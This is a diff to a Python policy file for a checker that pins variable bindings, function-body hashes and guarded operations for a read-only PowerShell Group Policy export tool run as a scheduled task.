+                    "[script] = Get-Credential -UserName $ServiceAccount -Message 'Collection "
+                    "task credentials (saved only by Windows Task Scheduler)'"
                 ),
-                "param",
+                "[script] param",
             }
         ),
-        # New-ScheduledTaskTrigger argument
+        # new-scheduledtasktrigger argument
         "everydays": frozenset(
             {
-                "param 1",
+                "[script] param 1",
             }
         ),
-        # New-ScheduledTaskSettingsSet argument
+        # new-scheduledtasksettingsset argument
         "executiontimelimit": frozenset(
             {
-                "param [timespan]::FromHours(2)",
+                "[script] param [timespan]::FromHours(2)",
             }
         ),
         # read by a binding of $account
         "gmsaaccount": frozenset(
             {
-                "param",
+                "[script] param",
             }
         ),
         # read by a binding of $taskargs
         "inventorypath": frozenset(
             {
-                "param",
+                "[script] param",
             }
         ),
-        # receiver of .Dispose()
+        # receiver of .dispose()
         "lock": frozenset(
             {
                 (
-                    "= [IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
-                    "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, "
-                    "[IO.FileShare]::None)"
+                    "[set-gpolenscollectionowner] = [IO.File]::Open((Join-Path $OutputRoot "
+                    "'collection.lock'), [IO.FileMode]::OpenOrCreate, "
+                    "[IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
                 ),
             }
         ),
         # read by a binding of $taskargs
         "logfiles": frozenset(
             {
-                "param 5",
+                "[script] param 5",
             }
         ),
         # read by a binding of $taskargs
         "logmaxbytes": frozenset(
             {
-                "param 5242880",
+                "[script] param 5242880",
             }
         ),
         # write root
         "marker": frozenset(
             {
-                "= Join-Path $OutputRoot '.gpo-lens-collection-owner'",
-                "arg $marker",
+                "[read-gpolensownermarkerbytes] arg $marker",
+                (
+                    "[set-gpolenscollectionowner] = Join-Path $OutputRoot "
+                    "'.gpo-lens-collection-owner'"
+                ),
             }
         ),
         # write root
         "outputroot": frozenset(
             {
-                "= [IO.Path]::GetFullPath($OutputRoot)",
-                "arg $OutputRoot",
-                "param",
+                "[script] = [IO.Path]::GetFullPath($OutputRoot)",
+                "[script] param",
+                "[set-gpolenscollectionowner] arg $OutputRoot",
+                "[set-gpolenscollectionowner] param",
+                "[write-gpolensownermarkerbytes] arg $OutputRoot",
             }
         ),
         # read by a binding of $bytes
         "previousbytes": frozenset(
             {
-                "= $null",
-                "= Read-GpoLensOwnerMarkerBytes -Marker $marker",
+                "[set-gpolenscollectionowner] = $null",
+                "[set-gpolenscollectionowner] = Read-GpoLensOwnerMarkerBytes -Marker $marker",
             }
         ),
-        # New-ScheduledTask argument
+        # new-scheduledtask argument
         "principal": frozenset(
             {
                 (
-                    "= New-ScheduledTaskPrincipal -UserId $account -LogonType Password "
-                    "-RunLevel Limited"
+                    "[script] = New-ScheduledTaskPrincipal -UserId $account -LogonType "
+                    "Password -RunLevel Limited"
                 ),
             }
         ),
@@ -1277,110 +1330,114 @@ PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
         "registertask": frozenset(
             {
                 (
-                    "arg { if ($GmsaAccount) { Register-ScheduledTask -TaskName $TaskName "
-                    "-InputObject $task -Force | Out-Null } else { Register-ScheduledTask "
-                    "-TaskName $TaskName -InputObject $task -User $ServiceAccount -Password "
-                    "$taskPassword -Force | Out-Null } }"
+                    "[set-gpolenscollectionowner] arg { if ($GmsaAccount) { "
+                    "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force | "
+                    "Out-Null } else { Register-ScheduledTask -TaskName $TaskName -InputObject "
+                    "$task -User $ServiceAccount -Password $taskPassword -Force | Out-Null } }"
                 ),
-                "param",
+                "[set-gpolenscollectionowner] param",
             }
         ),
         # read by a binding of $taskargs
         "retention": frozenset(
             {
-                "param 14",
+                "[script] param 14",
             }
         ),
         # read by a binding of $taskargs
         "runner": frozenset(
             {
                 (
-                    "= (Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
+                    "[script] = (Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
                     "'Run-GpoLensCollection.ps1')).ProviderPath"
                 ),
             }
         ),
-        # New-ScheduledTaskTrigger argument
+        # new-scheduledtasktrigger argument
         "scheduletime": frozenset(
             {
-                "= [datetime]::MinValue",
+                "[script] = [datetime]::MinValue",
                 (
-                    "ref [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[script] ref [datetime]::TryParseExact($At, 'HH:mm', "
                     "[Globalization.CultureInfo]::InvariantCulture, "
                     "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)"
                 ),
             }
         ),
-        # Register-ScheduledTask argument
+        # register-scheduledtask argument
         "serviceaccount": frozenset(
             {
-                "param",
+                "[script] param",
             }
         ),
-        # New-ScheduledTask argument
+        # new-scheduledtask argument
         "settings": frozenset(
             {
                 (
-                    "= New-ScheduledTaskSettingsSet -ExecutionTimeLimit $ExecutionTimeLimit ` "
-                    "-MultipleInstances IgnoreNew -StartWhenAvailable"
+                    "[script] = New-ScheduledTaskSettingsSet -ExecutionTimeLimit "
+                    "$ExecutionTimeLimit ` -MultipleInstances IgnoreNew -StartWhenAvailable"
                 ),
             }
         ),
-        # Register-ScheduledTask argument
+        # register-scheduledtask argument
         "task": frozenset(
             {
                 (
-                    "= New-ScheduledTask -Action $action -Trigger $trigger -Principal "
+                    "[script] = New-ScheduledTask -Action $action -Trigger $trigger -Principal "
                     "$principal -Settings $settings ` -Description 'Read-only GPO export, "
                     "bounded retention, rotating logs and optional ZIP delivery.'"
                 ),
             }
         ),
-        # New-ScheduledTaskAction argument
+        # new-scheduledtaskaction argument
         "taskargs": frozenset(
             {
                 (
-                    "+= ' -CopyTo ' + (ConvertTo-GpoLensTaskArgument "
+                    "[script] += ' -CopyTo ' + (ConvertTo-GpoLensTaskArgument "
                     "(ConvertTo-GpoLensAbsolutePath $CopyTo))"
                 ),
                 (
-                    "+= ' -InventoryPath ' + (ConvertTo-GpoLensTaskArgument "
+                    "[script] += ' -InventoryPath ' + (ConvertTo-GpoLensTaskArgument "
                     "(ConvertTo-GpoLensAbsolutePath $InventoryPath))"
                 ),
                 (
-                    "= '-NoProfile -NonInteractive -File ' + (ConvertTo-GpoLensTaskArgument "
-                    "$runner) + ' -CollectorPath ' + (ConvertTo-GpoLensTaskArgument "
-                    "$CollectorPath) + ' -OutputRoot ' + (ConvertTo-GpoLensTaskArgument "
-                    "$OutputRoot) + ' -TaskName ' + (ConvertTo-GpoLensTaskArgument $TaskName) "
-                    '+ " -Retention $Retention -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"'
+                    "[script] = '-NoProfile -NonInteractive -File ' + "
+                    "(ConvertTo-GpoLensTaskArgument $runner) + ' -CollectorPath ' + "
+                    "(ConvertTo-GpoLensTaskArgument $CollectorPath) + ' -OutputRoot ' + "
+                    "(ConvertTo-GpoLensTaskArgument $OutputRoot) + ' -TaskName ' + "
+                    '(ConvertTo-GpoLensTaskArgument $TaskName) + " -Retention $Retention '
+                    '-LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"'
                 ),
             }
         ),
-        # Unregister-ScheduledTask argument
+        # unregister-scheduledtask argument
         "taskname": frozenset(
             {
-                "arg $TaskName",
-                "param",
-                "param 'GpoLensCollection'",
+                "[script] param 'GpoLensCollection'",
+                "[set-gpolenscollectionowner] arg $TaskName",
+                "[set-gpolenscollectionowner] param",
             }
         ),
-        # Register-ScheduledTask argument
+        # register-scheduledtask argument
         "taskpassword": frozenset(
             {
-                "= $Credential.GetNetworkCredential().Password",
-                "= $null",
+                "[script] = $Credential.GetNetworkCredential().Password",
+                "[script] = $null",
             }
         ),
-        # New-ScheduledTask argument
+        # new-scheduledtask argument
         "trigger": frozenset(
             {
-                "= New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At $scheduleTime",
+                (
+                    "[script] = New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At "
+                    "$scheduleTime"
+                ),
             }
         ),
-        # New-ScheduledTaskAction argument
+        # new-scheduledtaskaction argument
         "windowsroot": frozenset(
             {
-                "= if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }",
+                "[script] = if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }",
             }
         ),
     },
@@ -1509,6 +1566,11 @@ TASK_ARG_VECTORS: dict[str, frozenset[TaskVector]] = {
     ),
 }
 _TASK_ACTION_SCRIPT = "Register-GpoLensCollection.ps1"
+# Casefolded view (command and parameter names; values stay verbatim).
+_TASK_VECTORS_CF: dict[str, frozenset[TaskVector]] = {
+    cmd.casefold(): frozenset(frozenset((p.casefold(), v) for p, v in vec) for vec in vectors)
+    for cmd, vectors in TASK_ARG_VECTORS.items()
+}
 
 # ---------------------------------------------------------------------------
 # Round-4 closed sets (both reviewers' round-3 findings). Strict default: what
@@ -1748,6 +1810,55 @@ LOCAL_FUNCTIONS: dict[str, tuple[str, ...]] = {
         "Set-GpoLensCollectionOwner",
     ),
 }
+# SHA-256 of each local function's normalized syntax tree (the same row format
+# as the golden, rooted at the FunctionDefinitionAst). HAND-MAINTAINED: the
+# generator never writes this table (test_generator_never_writes_policy). Keys
+# are function names; check_local_function_bodies compares casefolded.
+LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
+    "Export-GpoEstate.ps1": {
+        "New-GpoExportZip": ("aacc73f36d374f73a77e565caf6883eb5c1e244669f3fa8d545e944be8315c25"),
+        "Set-SectionProgress": ("452134c5d14fa82771a8f7e1cd085b3621ee16dc33457432f1f5b5db3ad82cc6"),
+    },
+    "Export-GroupMembers.ps1": {},
+    "Export-Principals.ps1": {},
+    "Run-GpoLensCollection.ps1": {
+        "Write-GpoLensCollectionLog": (
+            "c063dec4d809ec58838c2f60022832f4e8bf67aaf839b70f54cba37b8214a36d"
+        ),
+        "Get-GpoLensCompletedExports": (
+            "884c8f50670f56a5c6e432421ebd433981523bacbd5a0dea001c33d96f7f14cb"
+        ),
+        "Assert-GpoLensRegularTree": (
+            "641bc5815235b9475ec326e3993752ac02a926fef931b616c15c68d99f802858"
+        ),
+        "Assert-GpoLensCollectionOwner": (
+            "e740eccc68f64c0de6205a6b41d9f711ec007d44005a95898ae03a7b6e048c63"
+        ),
+        "Invoke-GpoLensCollection": (
+            "db7b24ed2e8b5fc621a596f8fab2b06ca6fe90b4088da6c194223ce31cacca99"
+        ),
+    },
+    "GpoLensCollectionMarker.ps1": {
+        "Read-GpoLensOwnerMarkerBytes": (
+            "fc4ea3b3baa91934c20ca92086e70949ef98073640aafd382a20a6437382b4e1"
+        ),
+        "Write-GpoLensOwnerMarkerBytes": (
+            "85bacfbf2e5a9538af9b3ecbc60dbdcdfe8da9cef00a5b9a885e6dd0d3ccc9ca"
+        ),
+    },
+    "Register-GpoLensCollection.ps1": {
+        "ConvertTo-GpoLensTaskArgument": (
+            "b21ec1b0406abf8920ffa137650660617e27a873b106c83e32db99e84df08699"
+        ),
+        "ConvertTo-GpoLensAbsolutePath": (
+            "3167a68a6db407a4a1af18d6df9046eab0e70cb61a50e2950c93044b3b815ea0"
+        ),
+        "Set-GpoLensCollectionOwner": (
+            "f454df3d2b26c45ae4061fb5e40fe9a4c606971defb98eb37f9e15c95ee2a0a5"
+        ),
+    },
+}
+
 # Pinned write/exec operations with their control-flow context (see
 # check_guarded_ops). Each entry is (normalized operation text, context from
 # outermost to innermost).
@@ -1956,8 +2067,24 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "$zip.Dispose()",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "guard if ($zipEnumErr) -> throw",
+                "finally",
+            ),
+        ),
+        (
             '[System.IO.File]::WriteAllText($testFile, "test")',
             ("try",),
+        ),
+        (
+            "New-GpoExportZip -ExportPath $out",
+            (
+                "guard if ($DryRun) -> return",
+                "if (-not $NoZip) after []",
+            ),
         ),
     ),
     "Export-GroupMembers.ps1": (
@@ -2140,6 +2267,15 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ("function Write-GpoLensCollectionLog",),
         ),
         (
+            "$zip.Dispose()",
+            (
+                "function Get-GpoLensCompletedExports",
+                "foreach ($archive in $candidates)",
+                "finally",
+                "if ($zip) after []",
+            ),
+        ),
+        (
             (
                 "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                 "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
@@ -2265,6 +2401,241 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "try",
             ),
         ),
+        (
+            "$stream.Dispose()",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "try",
+                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
+                "if ($InventoryPath) after []",
+                "finally",
+            ),
+        ),
+        (
+            "$zip.Dispose()",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "catch []",
+                "if ($zip) after []",
+            ),
+        ),
+        (
+            "$zip.Dispose()",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "finally",
+                "if ($zip) after []",
+            ),
+        ),
+        (
+            "$lock.Dispose()",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "finally",
+            ),
+        ),
+        (
+            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
+            (
+                "function Assert-GpoLensCollectionOwner",
+                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
+            ),
+        ),
+        (
+            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+            ),
+        ),
+        (
+            "Write-GpoLensCollectionLog @logArgs -Message 'Collection started'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            "Write-GpoLensCollectionLog @logArgs -Message ($_ | Out-String).TrimEnd()",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "scriptblock positional of ForEach-Object",
+            ),
+        ),
+        (
+            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            'Write-GpoLensCollectionLog @logArgs -Message "ZIP delivered: $delivery"',
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+            ),
+        ),
+        (
+            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            (
+                'Write-GpoLensCollectionLog @logArgs -Message "Collection succeeded: '
+                '$($newest.Name); retained at most $Retention exports"'
+            ),
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            (
+                'Write-GpoLensCollectionLog @logArgs -Message "Collection failed: '
+                '$($failure.Exception.Message)"'
+            ),
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "catch []",
+                "try",
+            ),
+        ),
+        (
+            (
+                "Invoke-GpoLensCollection -OutputRoot $OutputRoot -CollectorPath "
+                "$CollectorPath ` -TaskName $TaskName ` -Retention $Retention -CopyTo $CopyTo "
+                "-InventoryPath $InventoryPath ` -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "try",
+                "guard if (-not $OutputRoot) -> throw",
+            ),
+        ),
     ),
     "GpoLensCollectionMarker.ps1": (
         (
@@ -2307,6 +2678,30 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "$bytes.Dispose()",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "guard if ($links -ne 1) -> throw",
+                "finally",
+            ),
+        ),
+        (
+            "$stream.Dispose()",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "finally",
+            ),
+        ),
+        (
             "[IO.File]::Delete($marker)",
             (
                 "function Write-GpoLensOwnerMarkerBytes",
@@ -2338,6 +2733,17 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                     "[IO.FileAttributes]::ReparsePoint)) -> throw"
                 ),
                 "try",
+            ),
+        ),
+        (
+            "$stream.Dispose()",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "finally",
             ),
         ),
     ),
@@ -2449,6 +2855,85 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "else of [($null -ne $previousBytes)]",
             ),
         ),
+        (
+            "$lock.Dispose()",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "finally",
+            ),
+        ),
+        (
+            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "if (Test-Path -LiteralPath $marker) after []",
+            ),
+        ),
+        (
+            (
+                "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes "
+                "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
+            ),
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "try",
+            ),
+        ),
+        (
+            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes $previousBytes",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "catch []",
+                "if ($null -ne $previousBytes) after []",
+            ),
+        ),
+        (
+            (
+                "Set-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName "
+                "-Force:$Force -RegisterTask { if ($GmsaAccount) { Register-ScheduledTask "
+                "-TaskName $TaskName -InputObject $task -Force | Out-Null } else { "
+                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
+                "$ServiceAccount -Password $taskPassword -Force | Out-Null } }"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "try",
+            ),
+        ),
     ),
 }
 
@@ -2496,6 +2981,13 @@ _SIDE_EFFECTING_METHODS = frozenset(
         "DeleteValue",
         "InvokeSet",
     }
+)
+# Methods that end or change the lifetime of a handle/resource. Releasing the
+# collection lock early (a duplicate `$lock.Dispose()` before the protected
+# block, Sol round-4 BL-3) unprotects everything after it, so these are guarded
+# operations too: their count AND control-flow context are pinned.
+_LIFETIME_METHODS = frozenset(
+    {"Dispose", "Close", "Flush", "Release", "ReleaseMutex", "Unlock", "Lock", "SetLength"}
 )
 
 # A pinned root may legitimately be bound by a `foreach ($v in ...)` loop only
@@ -2615,6 +3107,13 @@ _WRITE_STATIC = {
 # directory (a symlink/junction to SYSVOL re-points a confined root — Sol
 # set_itemtype).
 _FORBIDDEN_ITEM_TYPES = {"symboliclink", "junction", "hardlink"}
+# Casefolded views of the tables above (names are canonicalized on load).
+_WRITE_COMMANDS_CF = {
+    k.casefold(): tuple(p.casefold() for p in v) for k, v in _WRITE_COMMANDS.items()
+}
+_OPTIONAL_PATH_COMMANDS_CF = {
+    k.casefold(): tuple(p.casefold() for p in v) for k, v in _OPTIONAL_PATH_COMMANDS.items()
+}
 # A variable reference in source text: `$name`, `$scope:name`, `$drive:name` or
 # `${...}`. Scope prefixes are stripped by _bare_var; a drive (env:) is kept.
 _VARIABLE = re.compile(r"\$(?:\{([^}]+)\}|((?:[A-Za-z_][A-Za-z0-9_]*:)?[A-Za-z_][A-Za-z0-9_]*))")
@@ -2653,7 +3152,67 @@ def _vars_in(text: str | None) -> set[str]:
 
 
 def _normalize_type(name: str) -> str:
-    return name.removeprefix("System.")
+    """Canonical (casefolded, ``System.``-less) .NET type name."""
+    cf = _cf(name)
+    return cf[len("system.") :] if cf.startswith("system.") else cf
+
+
+def _cfset(names: Any) -> frozenset[str]:
+    return frozenset(_cf(n) for n in names)
+
+
+def _method_key(type_name: str | None, member: str | None) -> str:
+    return f"{_normalize_type(type_name or '')}::{_cf(member or '')}"
+
+
+_WRITE_STATIC_CF = frozenset(_method_key(*k.split("::")) for k in _WRITE_STATIC)
+
+
+def _canonicalize(entry: dict[str, Any]) -> dict[str, Any]:
+    """Casefold every command, function, parameter, member, type and variable
+    name in the semantic projections, once, as the inventory is loaded.
+
+    PowerShell resolves all of these case-insensitively, so every comparison in
+    the checks below is made against casefolded policy tables (adcs-lens found
+    `_WRITEJSON` passing a check written for `_writeJson`). Source TEXT fields
+    (binding right-hand sides, operation text, guard conditions) are left as
+    written: they are compared verbatim, so a re-cased copy of a pinned
+    expression is a new value and fails closed. ``ast_rows`` keep the source
+    spelling (the golden records it).
+    """
+    if "commands" not in entry:
+        return entry  # -AstOnly / -Sites records
+    for command in entry["commands"]:
+        if command["name"]:
+            command["name"] = _cf(command["name"])
+        command["function"] = _cf(command["function"])
+        command["bound"] = {_cf(k): v for k, v in command["bound"].items()}
+        for arg in command["arguments"]:
+            if arg["parameter"]:
+                arg["parameter"] = _cf(arg["parameter"])
+    for member in entry["members"]:
+        member["function"] = _cf(member["function"])
+        for key in ("member", "type", "receiver_var"):
+            if member[key]:
+                member[key] = _cf(member[key])
+    entry["functions"] = [_cf(n) for n in entry["functions"]]
+    for fn in entry["function_params"]:
+        fn["name"] = _cf(fn["name"])
+        fn["params"] = [_cf(n) for n in fn["params"]]
+        fn["pipeline_params"] = [_cf(n) for n in fn["pipeline_params"]]
+    for binding in entry["variable_assignments"]:
+        binding["name"] = _cf(binding["name"])
+        binding["function"] = _cf(binding["function"])
+    for ref in entry["variable_refs"]:
+        ref["name"] = _cf(ref["name"])
+        ref["drive"] = _cf(ref["drive"])
+    for key in ("member_assignments", "index_assignments"):
+        for item in entry[key]:
+            item["function"] = _cf(item["function"])
+            var = "receiver_var" if key == "member_assignments" else "root_var"
+            if item[var]:
+                item[var] = _cf(item[var])
+    return entry
 
 
 # ---------------------------------------------------------------------------
@@ -2670,9 +3229,13 @@ def _normalize_type(name: str) -> str:
 #   "pipeline"                   a ValueFromPipeline parameter
 #   "common -<Param>"            -OutVariable/-ErrorVariable/... writes it
 #   "member <target> = <rhs>"    a property write on the variable's object
